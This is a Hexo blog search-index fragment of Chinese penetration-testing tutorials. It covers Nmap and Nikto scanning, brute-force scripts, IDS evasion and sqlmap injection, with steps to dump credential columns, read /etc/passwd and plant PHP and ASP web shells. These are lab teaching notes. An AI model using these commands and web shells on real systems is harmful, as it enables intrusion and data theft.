id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><p>用户名：Admin</p><p>密码：Admin@1234</p>]]></content>
      
      
      <categories>
          
          <category> CTF平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF平台搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap及Nikto使用</title>
      <link href="/9a36.html"/>
      <url>/9a36.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h2 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.10 192.168.1.20</span><br><span class="line">nmap 192.168.1.10-192.168.20</span><br></pre></td></tr></table></figure><h2 id="详细扫描输出"><a href="#详细扫描输出" class="headerlink" title="详细扫描输出"></a>详细扫描输出</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="指定端口扫描"><a href="#指定端口扫描" class="headerlink" title="指定端口扫描"></a>指定端口扫描</h2><p>默认扫描1到10000端口</p><h3 id="单端口"><a href="#单端口" class="headerlink" title="单端口"></a>单端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="端口范围"><a href="#端口范围" class="headerlink" title="端口范围"></a>端口范围</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 1-3000 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="端口组合扫描"><a href="#端口组合扫描" class="headerlink" title="端口组合扫描"></a>端口组合扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389,1-3000 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="扫描排除"><a href="#扫描排除" class="headerlink" title="扫描排除"></a>扫描排除</h2><p>排除就是在当扫描某一个网段的时候，不扫这个主机</p><h3 id="排除一个主机"><a href="#排除一个主机" class="headerlink" title="排除一个主机"></a>排除一个主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24 -exclude 192.168.1.100    <span class="comment"># 排除 .100 的主机</span></span><br></pre></td></tr></table></figure><h3 id="排除文件中的主机"><a href="#排除文件中的主机" class="headerlink" title="排除文件中的主机"></a>排除文件中的主机</h3><p>文件ip.txt里写的是IP地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24 -exclude ip.txt</span><br></pre></td></tr></table></figure><h2 id="Ping扫描"><a href="#Ping扫描" class="headerlink" title="Ping扫描"></a>Ping扫描</h2><p>主要用来探测主机存活，并不是探测端口开放</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br></pre></td></tr></table></figure><h2 id="SYN半开放扫描"><a href="#SYN半开放扫描" class="headerlink" title="SYN半开放扫描"></a>SYN半开放扫描</h2><p>不需要通过完整握手，目标主机不会产生会话。更加隐蔽</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP&#x2F;UDP扫描"></a>TCP&#x2F;UDP扫描</h2><h3 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h2><p>检测目标主机上端口运行的软件版本，不是用于扫描主机和端口，但是需要通过开放的端口去判断。非常的慢。最好在测试之前先知道哪些端口开放，再针对端口去扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="操作系统扫描"><a href="#操作系统扫描" class="headerlink" title="操作系统扫描"></a>操作系统扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.1.10</span><br><span class="line">nmap -O --osscan-guess 192.168.1.10        <span class="comment"># 猜测匹配，猜测匹配最接近的操作系统</span></span><br></pre></td></tr></table></figure><h2 id="不用ping主机"><a href="#不用ping主机" class="headerlink" title="不用ping主机"></a>不用ping主机</h2><p>ping被拦截的情况下使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O -PN 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="从文件中读取扫描"><a href="#从文件中读取扫描" class="headerlink" title="从文件中读取扫描"></a>从文件中读取扫描</h2><p>读取文件里面的ip地址扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -iL ip.txt</span><br></pre></td></tr></table></figure><h2 id="路由跟踪扫描"><a href="#路由跟踪扫描" class="headerlink" title="路由跟踪扫描"></a>路由跟踪扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -traceroute 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>扫描的结果输出到屏幕，同时保存到1.txt</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389 -oG 1.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h1 id="Nmap脚本"><a href="#Nmap脚本" class="headerlink" title="Nmap脚本"></a>Nmap脚本</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=http-enum 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=dns-brute www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 22 --script=ssh-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br><span class="line"><span class="comment"># --script-args 指定用户及密码字典</span></span><br></pre></td></tr></table></figure><h2 id="MySQL爆破"><a href="#MySQL爆破" class="headerlink" title="MySQL爆破"></a>MySQL爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3306 --script=mysql-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="TELNET爆破"><a href="#TELNET爆破" class="headerlink" title="TELNET爆破"></a>TELNET爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 23 --script=telnet-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 445 --script=smb-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="FTP爆破"><a href="#FTP爆破" class="headerlink" title="FTP爆破"></a>FTP爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 21 -sT --script=smb-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong><a href="https://www.bmabk.com/index.php/post/133422.html" title="快点来学习吧">Nmap工具使用</a></strong></p><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><h2 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -h</span><br></pre></td></tr></table></figure><h2 id="查看插件"><a href="#查看插件" class="headerlink" title="查看插件"></a>查看插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto --list-plugins</span><br></pre></td></tr></table></figure><h2 id="对目标进行扫描"><a href="#对目标进行扫描" class="headerlink" title="对目标进行扫描"></a>对目标进行扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.10 </span><br><span class="line"><span class="comment"># 可以是url的形式，也可以扫描文本里面的ip</span></span><br><span class="line">nikto -host ip.txt</span><br></pre></td></tr></table></figure><h2 id="指定端口进行扫描"><a href="#指定端口进行扫描" class="headerlink" title="指定端口进行扫描"></a>指定端口进行扫描</h2><p>默认80端口，检查ssl一些常见问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host https://192.168.1.10 -ssl -port 443</span><br></pre></td></tr></table></figure><h2 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h2><p>支持：html、csv、json、nbe、sql、txt、xml</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.10 -o result.html</span><br></pre></td></tr></table></figure><hr><h2 id="IDS躲避"><a href="#IDS躲避" class="headerlink" title="IDS躲避"></a>IDS躲避</h2><p><img src="/../images/Nmap%E5%8F%8ANikto%E4%BD%BF%E7%94%A8231013.png"></p><table><thead><tr><th>1</th><th>随机url编码</th></tr></thead><tbody><tr><td>2</td><td>只选择路径</td></tr><tr><td>3</td><td>提前结束url</td></tr><tr><td>4</td><td>优先考虑长随机字符串</td></tr><tr><td>5</td><td>参数欺骗</td></tr><tr><td>6</td><td>使用tab作为命令分隔符</td></tr><tr><td>7</td><td>变化的url</td></tr><tr><td>8</td><td>使用windows路径分隔符</td></tr></tbody></table><p>使用evasion后跟序号即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host https://192.168.1.10 -ssl -port 443 -evasion 123456</span><br><span class="line"><span class="comment"># 使用IDS躲避规则的123456条来进行扫描</span></span><br></pre></td></tr></table></figure><h2 id="配合nmap使用"><a href="#配合nmap使用" class="headerlink" title="配合nmap使用"></a>配合nmap使用</h2><p>nmap扫描80端口的IP，并通过oG输出结果，通过“|”导入至nikto进行扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.1.10 -oG - | nikto -host -</span><br></pre></td></tr></table></figure><h2 id="使用代理扫描"><a href="#使用代理扫描" class="headerlink" title="使用代理扫描"></a>使用代理扫描</h2><p>避免暴露IP可以进行代理扫描，参数-useproxy，需要配合代理工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -h 192.168.1.10 -userproxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap使用</title>
      <link href="/ab6e.html"/>
      <url>/ab6e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Access-asp网站"><a href="#Access-asp网站" class="headerlink" title="Access+asp网站"></a>Access+asp网站</h1><h2 id="检测是否存在注入"><a href="#检测是否存在注入" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><blockquote><p>-v：详细登记（0-6，默认1）</p><p>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头<br>6：显示http响应内容</p></blockquote><p>输出back-end DBMS:Microsoft Access再出输入上面的命令，则会有注入语句提示</p><p><img src="/../images/Sqlmap%E4%BD%BF%E7%94%A8231013.png"></p><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables</span><br></pre></td></tr></table></figure><p><img src="/../images/Sqlmap%E4%BD%BF%E7%94%A8231013-1.png"></p><h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T admin</span><br><span class="line"><span class="comment"># -T admin    指定表名</span></span><br></pre></td></tr></table></figure><p><img src="/../images/Sqlmap%E4%BD%BF%E7%94%A8231013-2.png"></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T admin</span><br></pre></td></tr></table></figure><h1 id="Mysql-php网站"><a href="#Mysql-php网站" class="headerlink" title="Mysql+php网站"></a>Mysql+php网站</h1><h2 id="检测是否存在注入-1"><a href="#检测是否存在注入-1" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -v 1</span><br><span class="line"><span class="comment"># -p    指定测试参数</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名"><a href="#获取当前用户和数据库名" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --tables -D <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># -D &quot;admin&quot;    指定admin的数据库</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -T <span class="string">&quot;mmanage&quot;</span> --columns -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --dump -C <span class="string">&quot;user,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Mysql-asp-net网站"><a href="#Mysql-asp-net网站" class="headerlink" title="Mysql+asp.net网站"></a>Mysql+asp.net网站</h1><h2 id="检测是否存在注入-2"><a href="#检测是否存在注入-2" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-1"><a href="#获取当前用户和数据库名-1" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Orcale-jsp网站"><a href="#Orcale-jsp网站" class="headerlink" title="Orcale+jsp网站"></a>Orcale+jsp网站</h1><h2 id="检测是否存在注入-3"><a href="#检测是否存在注入-3" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale -v 3</span><br><span class="line"><span class="comment"># --dbms orcale    指定数据库类型</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-2"><a href="#获取当前用户和数据库名-2" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Post注入网站"><a href="#Post注入网站" class="headerlink" title="Post注入网站"></a>Post注入网站</h1><h2 id="检测是否存在注入-4"><a href="#检测是否存在注入-4" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><p>post信息</p><p>name&#x3D;admin&amp;sub&#x3D;%E6%90%9C</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-3"><a href="#获取当前用户和数据库名-3" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --current-user --current-db -p name -v 3</span><br></pre></td></tr></table></figure><p>如果是root用户，可以直接列出所有的数据库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --dbs -v 3</span><br></pre></td></tr></table></figure><h2 id="获取表名-4"><a href="#获取表名-4" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h1 id="Cookie注入网站"><a href="#Cookie注入网站" class="headerlink" title="Cookie注入网站"></a>Cookie注入网站</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2</span><br><span class="line"><span class="comment"># 指定测试等级，level&gt;=2时才会检测cookie</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-4"><a href="#获取数据-4" class="headerlink" title="获取数据"></a>获取数据</h2><p>其他步骤和上面的一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span> --level 2</span><br></pre></td></tr></table></figure><h1 id="Mysql注入对网站读写操作"><a href="#Mysql注入对网站读写操作" class="headerlink" title="Mysql注入对网站读写操作"></a>Mysql注入对网站读写操作</h1><h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p>只有root用户才有权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 1</span><br><span class="line"><span class="comment"># 读取/etc/passwd文件内容</span></span><br></pre></td></tr></table></figure><p>读取到的文件内容会保存在output文件夹里面</p><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>前提：要知道写入文件的路径，可以通过phpinfo，找到DOCUMENT_ROOT</p><p>先创建一个一句话木马的文件muma.php</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-write c:/muma.php --file-dest /www/web/default/simple/muma.php -v 1</span><br></pre></td></tr></table></figure><h1 id="Mysql交互式写shell和执行命令"><a href="#Mysql交互式写shell和执行命令" class="headerlink" title="Mysql交互式写shell和执行命令"></a>Mysql交互式写shell和执行命令</h1><p>前提：magic_autoes_gpc必须是关闭的才可以，phpinfo可以查看</p><p>需要root权限</p><p>有写的权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>上面的这条命令效果不是很好，建议使用下面这条，但是会产生两个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>在 <code>os-shell</code>中将一句话木马写入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;#&quot;</span>)%^&gt;&gt;d:\wwwroot\muma.asp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
